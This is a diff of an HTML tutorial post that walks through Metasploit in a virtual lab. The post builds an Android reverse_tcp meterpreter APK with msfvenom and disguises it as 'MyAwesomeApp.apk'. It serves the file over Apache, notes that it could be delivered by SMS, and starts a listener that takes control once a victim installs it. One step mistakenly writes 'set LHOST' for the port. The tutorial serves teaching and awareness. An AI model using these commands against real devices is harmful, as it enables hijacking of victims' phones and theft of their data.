@@ -169,41 +169,51 @@
                         <p>Firewalls work on the basic premise of blocking all incoming connections. So therefore all reverse connections are blocked by default. However, if any host initiates a forward connection it is allowed.</p>
                         <p><code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">reverse_tcp</code> is instead of the attacker initiating the connection (which will obviously be blocked by the firewall), the target initiates the connection to the attacker. The attacker can then take control of the target device and pass commands. It is a type of reverse shell.</p>
                         <p><img src="assets/post1pics/msf11.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
-                        <h4>Step 5:</h4>
+                        <h4>Step 7:</h4>
                         <p>The next step will be to configure the options for our payload. This can be done by running the command listed below.</p>
                         <pre><code data-language="shell">msf6> show options</code></pre>
                         <p>The <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color:white;">show options</code> command shows the current options for the payload. These can then be changed, as is demonstrated in further steps below.</p>
                         <p><img src="assets/post1pics/msf12.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
                         <p>The 2 options listed will be looked at namely; <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">LHOST</code> and <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">LPORT</code></p>
-                        <h4>Step 6:</h4>
+                        <h4>Step 8:</h4>
                         <p>To change the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">LHOST</code> option run the command as shown below.</p>
                         <pre><code data-language="shell">msf6> set LHOST ip_address</code></pre>
                         <p>The above command sets the IP address that will become a <i>Listener</i>, in other words which IP address all the communication from the victim will be forwarded to. This is set to the IP address our Kali Linux VM.</p>
-                        <h4>Step 7:</h4>
+                        <h4>Step 9:</h4>
                         <p>To change the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">LPORT</code> option run the command below.</p>
                         <pre><code data-language="shell">msf6> set LHOST port_number</code></pre>
                         <p>The above command changes the option of which port the <i>Listener</i> should receive information. This is usually an open port that is not being used by any other process or service.</p>
                         <p><img src="assets/post1pics/msf13.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
                         <p>The above picture demonstrates the options being changed. The IP address was set to <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">10.0.2.15</code> and the port was set to <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">4444</code></p>
-                        <h4>Step 8:</h4>
+                        <h4>Step 10:</h4>
+                        <p>The only thing remaining to do is begin the exploit. This can be achieved by running the <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">exploit</code> command as shown below.</p>
                         <pre><code data-language="shell">msf6> exploit</code></pre>
-                        <p>This aforementioned command begins the exploit and the <i>Listener</i> will listen to any incoming responses from the victim. This is usually after the victim installs the malicious APK file and opens it on their Android device. This is discussed further with the command listed below.</p>
-                        <h4>Step 9:</h4>
-                        <p>In a new terminal start up the Metasploit console once again, and input the following command</p>
-                        <pre><code data-language="shell">msf6> msfvenom –p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /var/www/html/share/filename.apk</code></pre>
-                        <p>This command is used to create the malicious payload for the Android device. The APK file is saved to the share folder of the Apache server on our Kali Linux VM. A screenshot is show below.</p>
-                        <p><img src="assets/post1pics/msf3.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
-                        <p>If you see how small this file is, then this should be a red flag for you as a victim in the future.</p>
+                        <p>This aforementioned command begins the exploit and the <i>Listener</i> will listen to any incoming responses from the victim. This is usually after the victim installs the malicious APK file and opens it on their Android device. This is discussed further in the next steps.</p>
+                        <p><img src="assets/post1pics/msf14.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <h4>Step 11:</h4>
+                        <p>Let us start to create the malicious APK file!</p>
+                        <p>In a new terminal start up the <i>Metasploit console</i> once again, and input the following <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">msfvenom</code> command.</p>
+                        <pre><code data-language="shell">msf6> msfvenom –p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /var/www/html/share/MyAwesomeApp.apk</code></pre>
+                        <p>The <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">msfvenom</code> command is used to create the malicious payload for the Android device. The APK file is saved to the share folder of the Apache server on our Kali Linux VM. A screenshot is show below.</p>
+                        <p><img src="assets/post1pics/msfvenom.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>If you see how small this file is, then this should be a <span style="color: red;">red flag</span> for you as a victim in the future.</p>
                         <p>You should feel like this if you do come across such a file in the wild.</p>
                         <p><img src="assets/post1pics/sweating-wet.gif" class="img-fluid mx-auto d-block" alt=""/></p>
-                        <p>The malicious APK can now be accessed on the Android device and installed. To do this, run the following command below.</p>
+                        <h4>Step 12:</h4>
+                        <p>The malicious APK can now be accessed on the virtual Android device and installed. To do this, open a new terminal in your Kali Linux VM and run the following <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">service</code> command below.</p>
                         <pre><code>service apache2 start</code></pre>
-                        <p>Accessing the following link on the Android device's browser will open up the share folder.</p>
+                        <p><img src="assets/post1pics/apache.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>Above we see that the malicious APK file has been created in the folder as we specified earlier. Additionally, running the following <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">service</code> command will show you if the Apache server is indeed up and running.</p>
+                        <pre><code data-language="shell">service apache2 status</code></pre>
+                        <p>Accessing the following link <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">http://IP_Address/share/</code> on the virtual Android device's browser will open up the share folder.</p>
                         <pre><code>10.0.2.15/share/</code></pre>
-                        <p>This is shown below.</p>
-                        <img src="assets/post1pics/msf4.PNG" class="img-fluid mx-auto d-block" alt=""/>
+                        <p>The <code style="padding: .2em .4em; margin: 0;font-size: 85%; background-color: rgb(52 57 66); border-radius: 6px; color: white;">IP_Address</code> was replaced with the our Kali Linux VM's IP address. This is shown below.</p>
+                        <img src="assets/post1pics/apache2.PNG" class="img-fluid mx-auto d-block" alt=""/>
+                        <p>In a real world setting this link can automatically download the file if embedded in a SMS for example.</p>
                         <p>Once the victim downloads the file and opens it, they will see the following installation screen.</p>
-                        <img src="assets/post1pics/msf5.PNG" class="img-fluid mx-auto d-block" alt=""/>
+                        <img src="assets/post1pics/app1.PNG" class="img-fluid mx-auto d-block" alt=""/>
+                        <img src="assets/post1pics/app2.PNG" class="img-fluid mx-auto d-block" alt=""/>
+                        <p>If you carefully look at the permissions </p>
                         <p>If the malicious file is installed, it is game over!</p>
                         <p>The hacker is going to be like</p>
                         <p><img src="assets/post1pics/thumbs-up-hacker.gif" class="img-fluid mx-auto d-block" alt=""/></p>
